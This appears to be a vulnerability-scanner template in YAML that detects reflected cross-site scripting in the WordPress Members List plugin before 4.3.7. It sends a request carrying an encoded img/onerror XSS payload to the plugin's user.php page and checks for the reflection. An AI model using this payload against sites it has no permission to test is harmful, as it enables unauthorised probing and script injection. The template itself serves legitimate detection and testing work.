id: members-list-xss
info:
  author: Akincibor
  description: The plugin does not sanitise and escape some parameters in various
    pages before outputting them back, leading to Reflected Cross-Site Scripting issues.
  name: Members List < 4.3.7 - Reflected Cross-Site Scripting
  reference:
  - https://wpscan.com/vulnerability/d13f26f0-5d91-49d7-b514-1577d4247648
  severity: medium
  tags: wp,wordpress,wp-plugin,xss
requests:
- matchers:
  - condition: and
    part: body
    type: word
    words:
    - '"><img src onerror=alert(document.domain) x'
    - wrap tern-wrap
  - part: header
    type: word
    words:
    - text/html
  - status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/wp-content/plugins/members-list/admin/view/user.php?page=%22%3E%3Cimg%20src%20onerror=alert(document.domain)%20x'
